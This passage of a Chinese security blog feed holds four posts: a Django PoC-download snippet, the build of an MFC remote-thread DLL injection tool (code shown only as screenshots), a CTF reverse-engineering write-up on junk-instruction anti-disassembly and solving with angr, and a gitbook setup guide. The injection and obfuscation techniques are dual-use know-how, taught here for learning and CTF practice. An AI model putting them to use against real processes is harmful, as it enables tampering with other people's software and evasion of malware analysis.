<h6 id="0x25-文件下载"><a href="#0x25-文件下载" class="headerlink" title="0x25 文件下载"></a>0x25 文件下载</h6><p>单个poc文件下载功能，直接在页面上做了下载链接，点击即可下载对应poc：</p>
<p>view.py：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def download_file(request, vul_id):</span><br><span class="line">    search_lists &#x3D; vul_info.objects.get(vul_id&#x3D;vul_id)</span><br><span class="line">    file_name &#x3D; search_lists.poc_file</span><br><span class="line">    the_file_name &#x3D; &#39;#文件存储的地址&#39;+ file_name</span><br><span class="line">    file &#x3D; open(the_file_name, &#39;rb&#39;)</span><br><span class="line">    response &#x3D; StreamingHttpResponse(file)</span><br><span class="line">    response[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;octet-stream&#39;</span><br><span class="line">    response[&#39;Content-Disposition&#39;] &#x3D; &#39;attachement;filename&#x3D;&quot;&#123;0&#125;&quot;&#39;.format(file_name)</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>

<p>前端：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305144648161-4928991.png" alt="image-20210305144648161"></p>
<p>效果图：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305144804727-4928991.png" alt="image-20210305144804727"></p>
]]></content>
      <tags>
        <tag>django</tag>
        <tag>python-web</tag>
      </tags>
  </entry>
  <entry>
    <title>dll注入工具实现</title>
    <url>/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="一个dll注入工具的实现"><a href="#一个dll注入工具的实现" class="headerlink" title="一个dll注入工具的实现"></a>一个dll注入工具的实现</h4><p>编译器：vs2019</p>
<p>实现的功能：</p>
<ul>
<li>选择进程和dll文件，实现dll远程线程注入和卸载</li>
</ul>
<p>项目地址：<a href="https://github.com/0xkami/dllinject">https://github.com/0xkami/dllinject</a></p>
<a id="more"></a>

<h5 id="0x0-程序运行情况"><a href="#0x0-程序运行情况" class="headerlink" title="0x0 程序运行情况"></a>0x0 程序运行情况</h5><p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123155246897.png" alt="image-20211123155246897"></p>
<p>选择一个进程</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123155356079.png" alt="image-20211123155356079"></p>
<p>选择一个dll文件</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123155441554.png" alt="image-20211123155441554"></p>
<p>点击注入</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123155459217.png" alt="image-20211123155459217"></p>
<p>注入成功</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123155615052.png" alt="image-20211123155615052"></p>
<p>卸载成功</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123155648715.png" alt="image-20211123155648715"></p>
<h5 id="0x1-在vs2019中安装mfc"><a href="#0x1-在vs2019中安装mfc" class="headerlink" title="0x1 在vs2019中安装mfc"></a>0x1 在vs2019中安装mfc</h5><p>启动vs installer：</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123145743193.png" alt="image-20211123145743193"></p>
<p>选择C++桌面开发中的mfc选择，直接安装即可</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123145809548.png" alt="image-20211123145809548"></p>
<h5 id="0x2-创建一个基本的mfc项目"><a href="#0x2-创建一个基本的mfc项目" class="headerlink" title="0x2 创建一个基本的mfc项目"></a>0x2 创建一个基本的mfc项目</h5><p>选择mfc应用</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123143913306.png" alt="image-20211123143913306"></p>
<p>有多种类型，可以了解一下然后选择对应的</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144051651.png" alt="image-20211123144051651"></p>
<p>生成完成后，界面如图</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144123561.png" alt="image-20211123144123561"></p>
<p>点击调试，即可运行一个最初的demo</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144145966.png" alt="image-20211123144145966"></p>
<h5 id="0x3-设计界面"><a href="#0x3-设计界面" class="headerlink" title="0x3 设计界面"></a>0x3 设计界面</h5><h6 id="0x31-设计界面"><a href="#0x31-设计界面" class="headerlink" title="0x31 设计界面"></a>0x31 设计界面</h6><p>打开资源文件</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123150210944.png" alt="image-20211123150210944"></p>
<p>可以看到程序的界面，点击视图中的工具箱，调出按钮等控件集合</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144244771.png" alt="image-20211123144244771"></p>
<p>进行设计即可</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144300259.png" alt="image-20211123144300259"></p>
<h6 id="0x32-修改icon"><a href="#0x32-修改icon" class="headerlink" title="0x32 修改icon"></a>0x32 修改icon</h6><p>在资源中导入一个新的icon</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123154948321.png" alt="image-20211123154948321"></p>
<p>在代码中修改为新的icon的id值</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123154911221.png" alt="image-20211123154911221"></p>
<p>效果如下：</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123162100461.png" alt="image-20211123162100461"></p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123155201109.png" alt="image-20211123155201109"></p>
<h5 id="0x4-编写功能"><a href="#0x4-编写功能" class="headerlink" title="0x4 编写功能"></a>0x4 编写功能</h5><p>想法是：</p>
<p>1、进程是一个下拉框，打开程序的时候就会自动加载所有的进程信息，选择一个对应的进程</p>
<p>2、dll文件有一个按钮，是文件选择功能，选择对应的dll文件</p>
<p>3、点击dll注入和卸载按钮可以实现对应的功能</p>
<h6 id="0x41-进程下拉框显示"><a href="#0x41-进程下拉框显示" class="headerlink" title="0x41 进程下拉框显示"></a>0x41 进程下拉框显示</h6><p>给下拉框添加一个变量，名字为combo1</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144329059.png" alt="image-20211123144329059"></p>
<p>点击下拉框，就可以进入到对应的代码位置</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123150615022.png" alt="image-20211123150615022"></p>
<p>不过我没有在这里写代码，因为进程加载是在程序初始化的时候</p>
<p>找到初始化时的代码，编写一个显示当前所有进程信息的功能</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144517966.png" alt="image-20211123144517966"></p>
<p>CreateToolhelp32Snapshot：获取指定进程的快照，以及这些进程使用的堆、模块和线程</p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot</a></p>
</blockquote>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144717863.png" alt="image-20211123144717863"></p>
<h6 id="0x42-文件选择功能"><a href="#0x42-文件选择功能" class="headerlink" title="0x42 文件选择功能"></a>0x42 文件选择功能</h6><p>给显示dll文件路径的编辑框添加一个变量，名称为dllpath</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144345787.png" alt="image-20211123144345787"></p>
<p>点击对应的按钮，到对应的代码位置，编写一个文件选择的功能，并用SetDlgItemText显示在编辑框中</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123144848771.png" alt="image-20211123144848771"></p>
<h6 id="0x43-dll注入功能"><a href="#0x43-dll注入功能" class="headerlink" title="0x43 dll注入功能"></a>0x43 dll注入功能</h6><p>点击dll注入按钮，进入代码界面</p>
<p>远程线程注入和dll卸载的代码在之前已经实现过，可以直接复用（修改一些参数和小细节）</p>
<p>只要获取到对应的进程id和dll文件的路径值即可</p>
<p>dll注入按钮：</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123145110065.png" alt="image-20211123145110065"></p>
<p>dll卸载功能代码：</p>
<p><img src="/2021/11/23/dll%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/image-20211123145615468.png" alt="image-20211123145615468"></p>
<h5 id="0x5-过程中的问题"><a href="#0x5-过程中的问题" class="headerlink" title="0x5 过程中的问题"></a>0x5 过程中的问题</h5><h6 id="0x51-mfc项目刚创建后就无法成功运行"><a href="#0x51-mfc项目刚创建后就无法成功运行" class="headerlink" title="0x51 mfc项目刚创建后就无法成功运行"></a>0x51 mfc项目刚创建后就无法成功运行</h6><p>解决方法：尽量不要去单个组件里面选，容易缺少文件，重新安装</p>
<h6 id="0x52-错误提示：CString类型没有合适的转换到LPCTSTR的函数等"><a href="#0x52-错误提示：CString类型没有合适的转换到LPCTSTR的函数等" class="headerlink" title="0x52 错误提示：CString类型没有合适的转换到LPCTSTR的函数等"></a>0x52 错误提示：CString类型没有合适的转换到LPCTSTR的函数等</h6><p>CString to LPCTSTR ：强制转换 LPCTSTR dllpath = (LPCTSTR)dllname;</p>
<p>CString to Dword：dwpid = _ttoi(strpid);</p>
<h6 id="0x53-截取字符串中的一部分"><a href="#0x53-截取字符串中的一部分" class="headerlink" title="0x53 截取字符串中的一部分"></a>0x53 截取字符串中的一部分</h6><p>CString的Left、mid、Right函数</p>
<h6 id="0x54-无法添加信息到下拉控件中"><a href="#0x54-无法添加信息到下拉控件中" class="headerlink" title="0x54 无法添加信息到下拉控件中"></a>0x54 无法添加信息到下拉控件中</h6><p>下断点调试，看变量值</p>
<p>Cstring的format函数很好用</p>
<h6 id="0x55-资源视图显示错误在另一个编辑器中打开"><a href="#0x55-资源视图显示错误在另一个编辑器中打开" class="headerlink" title="0x55 资源视图显示错误在另一个编辑器中打开"></a>0x55 资源视图显示错误在另一个编辑器中打开</h6><p>关闭Resource.h文件就可以了</p>
<h6 id="0x56-修改完icon之后exe的图标没有改"><a href="#0x56-修改完icon之后exe的图标没有改" class="headerlink" title="0x56 修改完icon之后exe的图标没有改"></a>0x56 修改完icon之后exe的图标没有改</h6><p>1、确认是否图标资源是最小的：一般mfc自动生成的IDR_MAINFRAME是128，自己添加的会大于128，顺序后延，编译时默认将ID最小的作为exe的图标。</p>
<p>2、清理图标缓存：<a href="https://blog.csdn.net/langb2014/article/details/50644792">https://blog.csdn.net/langb2014/article/details/50644792</a></p>
]]></content>
  </entry>
  <entry>
    <title>funnyre-花指令与符号执行angr</title>
    <url>/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/</url>
    <content><![CDATA[<p>从funnyre的题中学习花指令和符号执行angr</p>
<a id="more"></a>

<p>结合恶意代码实战分析书籍和funnyre题目：</p>
<h5 id="0x1-花指令"><a href="#0x1-花指令" class="headerlink" title="0x1 花指令"></a>0x1 花指令</h5><p>用来防止反编译。</p>
<h6 id="0x11-分为可执行和不可执行"><a href="#0x11-分为可执行和不可执行" class="headerlink" title="0x11 分为可执行和不可执行"></a>0x11 分为可执行和不可执行</h6><p><strong>可执行</strong>：</p>
<p>能够正常运行的但又不改变原始程序逻辑性。无用指令。特点：①可以正常运行；②不改变任何寄存器的值；③反汇编器可以正确反汇编该指令。</p>
<p>病毒在传播时通过变形引擎随机产生一组该类别花指令并插入到病毒正常代码中，可以改变病毒的特征码，从而起到变形的作用。</p>
<p><strong>不可执行</strong>：</p>
<p>插入到原始代码中但又不改变原始程序逻辑性。无用字节。特点：①不可以正常运行；②不改变任何寄存器的值；③反汇编器可能会错误反汇编这些字节。</p>
<p>是某个合法指令的一部分，但是程序运行时，位于实际不可执行的代码路径。</p>
<h6 id="0x12-常见花指令"><a href="#0x12-常见花指令" class="headerlink" title="0x12 常见花指令"></a>0x12 常见花指令</h6><h6 id="1、指向同一目的地址的两个连续条件跳转指令-虚假的call指令-jz-jnz-call"><a href="#1、指向同一目的地址的两个连续条件跳转指令-虚假的call指令-jz-jnz-call" class="headerlink" title="1、指向同一目的地址的两个连续条件跳转指令+虚假的call指令 jz+jnz+call"></a>1、指向同一目的地址的两个连续条件跳转指令+虚假的call指令 jz+jnz+call</h6><p>jz+jnz在效果上相当于jmp，则总是会跳转</p>
<p>ida这类面向代码流的反汇编工具：当遇到jnz的时候，不管false分支会不会执行，都会反汇编它</p>
<p>​                                                            当出现call指令时，会先反汇编紧跟call指令之后的字节，然后再反汇编call指令的调用目标</p>
<p>机器执行中：</p>
<p>hello字符串不会被当作指令执行，call会直接去pop</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126142113968.png" alt="image-20210126142113968"></p>
<p>但是反汇编中：</p>
<p>hello这串字符串被当作指令了</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126142153025.png" alt="image-20210126142153025"></p>
<p>可以使用c或者d转换数据和代码</p>
<p>general-option-numberofbytes可以显示出字节源码</p>
<h6 id="2、固定的跳转指令xor-jz"><a href="#2、固定的跳转指令xor-jz" class="headerlink" title="2、固定的跳转指令xor+jz"></a>2、固定的跳转指令xor+jz</h6><p>xor eax,eax会将eax寄存器置0，同时也会置位标志寄存器的zero标志，jz是如果zero标志被置位，就会跳转，那么就肯定会跳，但是反汇编器总会反汇编false分支，所以就会反汇编后续紧跟的。</p>
<p>如下图：E9和E8的作用一样，E9是jmp的字节码，E8是call的，可以用来欺骗反汇编器</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126144811365.png" alt="image-20210126144811365"></p>
<p>转换后：</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126144927590.png" alt="image-20210126144927590"></p>
<img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126145012481.png" alt="image-20210126145012481" style="zoom:50%;">

<h6 id="3、无效指令patchbyte"><a href="#3、无效指令patchbyte" class="headerlink" title="3、无效指令patchbyte"></a>3、无效指令patchbyte</h6><p>一个字节同时被两个指令使用，反编译器就会产生困惑</p>
<p>可以使用idc调用patchbyte函数，用nop指令序列替换</p>
<p>在这个图里，先执行mov，然后xor后寄存器置0，jz必然会执行，jz跳转到mov中间，后半个字符串是jmp指令，跳转到真正的位置</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126145914975.png" alt="image-20210126145914975"></p>
<p>但是反汇编中就会：</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126150038992.png" alt="image-20210126150038992"></p>
<p>使用idc进行简化，因为实际效果就是eax置0，所以可以将这些db都置0，改为nop</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126150251070.png" alt="image-20210126150251070"></p>
<h5 id="0x2-angr"><a href="#0x2-angr" class="headerlink" title="0x2 angr"></a>0x2 angr</h5><p>angr是一个利用python开发的二进制程序分析框架，安装时会修改libz3和libVEX，可能会影响其他程序的正常使用，所以学习使用python虚拟环境。</p>
<p>angr模拟执行的过程就像人阅读代码，一边阅读的过程一边做预测、抽象执行结果，预估“执行结果”。在angr模拟执行前，必须先将变量（内存或者寄存器）符号化（声明哪些变量是符号），这些符号化的输入也正是程序的输入抽象。</p>
<h6 id="0x21-安装虚拟环境virtualenvwrapper："><a href="#0x21-安装虚拟环境virtualenvwrapper：" class="headerlink" title="0x21 安装虚拟环境virtualenvwrapper："></a>0x21 安装虚拟环境virtualenvwrapper：</h6><p>pip install之后初始化source报错</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126160200586.png" alt="image-20210126160200586"></p>
<p>需要在~/.bashrc文件中设置python解释器的路径</p>
<p>插入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export VIRTUALENVWRAPPER_PYTHON&#x3D;&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">export VIRTUALENVWRAPPER_VIRTUALENV&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;virtualenv</span><br></pre></td></tr></table></figure>

<p>然后source ~/.bashrc生效</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126160341966.png" alt="image-20210126160341966"></p>
<h6 id="0x22-安装angr："><a href="#0x22-安装angr：" class="headerlink" title="0x22 安装angr："></a>0x22 安装angr：</h6><p><code>mkvirtualenv --python=$(which python3) angr &amp;&amp; pip install angr</code></p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126161130297.png" alt="image-20210126161130297"></p>
<p>环境就装好了</p>
<h6 id="0x23-angr使用："><a href="#0x23-angr使用：" class="headerlink" title="0x23 angr使用："></a>0x23 angr使用：</h6><p>参考：<a href="https://xz.aliyun.com/t/7117/#toc-17">https://xz.aliyun.com/t/7117/#toc-17</a></p>
<p>先创建一个proj，载入需要模拟执行的程序</p>
<p><code> &gt;&gt;&gt; proj = angr.Project(&#39;/bin/true&#39;)</code></p>
<p>factory，即  AngrObjectFactory，提供重要分析对象的接口，如 blocks / state / SimulationManager等</p>
<p>state，project 只是给出程序最初镜像的信息，state 可以给出模拟程序执行到某条指令时的进程的具体状态。可以设置 state 对象初始化寄存器/内存/栈帧等信息</p>
<p>通过solver可以访问求解引擎claripy，用于求解约束，也就可以求解出相应输出的输入</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126163407337.png" alt="image-20210126163407337"></p>
<h5 id="0x3-funnyre实践"><a href="#0x3-funnyre实践" class="headerlink" title="0x3 funnyre实践"></a>0x3 funnyre实践</h5><p>先修改花指令</p>
<p>40061A处的call有问题，使用c和d来转换</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126144235928.png" alt="image-20210126144235928"></p>
<p>用d转换成数据</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126143748946.png" alt="image-20210126143748946"></p>
<p>此时我们再用c将40061B转为代码，整个代码就变成了这样：</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126143848888.png" alt="image-20210126143848888"></p>
<p>根据上下的几个函数，应该大家格式都是一样，所以编写python脚本，使用idc的patchbyte把jz和jnz以及0e8h都给nop掉</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126153307012.png" alt="image-20210126153307012"></p>
<p>往下拉，发现这样的地方还有好几处，全都改掉之后，发现还是不能反编译</p>
<p>在main的地方感觉和平时见的不太一样，右键createp，创建一个函数，就可以反编译了：</p>
<p>接下来来看主函数：输入的flag长度要为38并且定义了首尾是flag{}，然后对所有字符进行了一大堆异或操作</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126153743674.png" alt="image-20210126153743674"></p>
<p>然后在最后，和unk_4025C0数组做对比</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126154110881.png" alt="image-20210126154110881"></p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126154152338.png" alt="image-20210126154152338"></p>
<p>这么多操作总不能重新写一个脚本跑</p>
<p>获取程序的开始地址：我们的程序开始是以v6=0开始，xor eax,eax就是将eax置0，64位rax是以eax作为其最低的32位</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126175926148.png" alt="image-20210126175926148"></p>
<p>获取存储要求解的字符串的开始地址：</p>
<p>在main函数里我们需要得知rbx的值，在main函数的前一个init函数中有定义</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126171814154.png" alt="image-20210126171814154"></p>
<p>获取这是我们最终想要的结果的地址：</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126171024631.png" alt="image-20210126171024631"></p>
<p>动态调试的时候在这里还看到了定义：</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126182027607.png" alt="image-20210126182027607"></p>
<p>使用angr，编写脚本如下：</p>
<p><img src="/2021/01/26/funnyre-%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8Cangr/image-20210126175145859.png" alt="image-20210126175145859"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>花指令</tag>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title>mac+gitbook笔记环境搭建</title>
    <url>/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h4 id="mac-gitbook笔记环境搭建"><a href="#mac-gitbook笔记环境搭建" class="headerlink" title="mac+gitbook笔记环境搭建"></a>mac+gitbook笔记环境搭建</h4><p>为了更方便看笔记以及总结漏洞复现情况，搭建了一个gitbook环境</p>
<a id="more"></a>

<p>ps：node版本为14时，安装gitbook会报错</p>
<h5 id="0x1-nvm安装：用来管理node版本"><a href="#0x1-nvm安装：用来管理node版本" class="headerlink" title="0x1 nvm安装：用来管理node版本"></a>0x1 nvm安装：用来管理node版本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;nvm-sh&#x2F;nvm.git</span><br><span class="line">cd nvm</span><br><span class="line">sh install.sh</span><br><span class="line">vim ~&#x2F;.bash_profile</span><br></pre></td></tr></table></figure>

<p>在bash_profile中输入如下字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export NVM_DIR&#x3D;&quot;$HOME&#x2F;.nvm&quot;</span><br><span class="line">[ -s &quot;$NVM_DIR&#x2F;nvm.sh&quot; ] &amp;&amp; \. &quot;$NVM_DIR&#x2F;nvm.sh&quot; </span><br><span class="line">[ -s &quot;$NVM_DIR&#x2F;bash_completion&quot; ] &amp;&amp; \. &quot;$NVM_DIR&#x2F;bash_completion&quot;</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210707144052355.png" alt="image-20210707144052355"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;.bash_profile</span><br><span class="line">nvm -v</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210707144130595.png" alt="image-20210707144130595"></p>
<p>安装v10版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvm install v10</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210707151354988.png" alt="image-20210707151354988"></p>
<p>转换使用v10版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nvm use 10</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210707151502733.png" alt="image-20210707151502733"></p>
<h6 id="问题1："><a href="#问题1：" class="headerlink" title="问题1："></a>问题1：</h6><p>发现每次重新打开终端都要source ~/.bash_profile才能更改配置</p>
<h6 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h6><p>zsh加载的是 ~/.zshrc文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ~&#x2F;.zshrc</span><br></pre></td></tr></table></figure>

<p>添加source ~/.bash_profile语句即可</p>
<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210707144557243.png" alt="image-20210707144557243"></p>
<h5 id="0x2-安装gitbook："><a href="#0x2-安装gitbook：" class="headerlink" title="0x2 安装gitbook："></a>0x2 安装gitbook：</h5><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">npm install -g gitbook-cli</span><br><span class="line">gitbook -V</span><br></pre></td></tr></table></figure>

<p>运行完成如下图：（顺便其中gitbook真的会装好久，换了源还是没有很快</p>
<p><img src="/2021/07/08/mac-gitbook%E7%AC%94%E8%AE%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210707163709690.png" alt="image-20210707163709690"></p>
<h5 id="0x3-使用gitbook："><a href="#0x3-使用gitbook：" class="headerlink" title="0x3 使用gitbook："></a>0x3 使用gitbook：</h5><p>建好文件夹后cd进入，初始化gitbook：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gitbook init</span><br></pre></td></tr></table></figure>

<p>自主修改readme.md和summary.md</p>
<p>summary.md（也就是目录）的内容如下：</p>
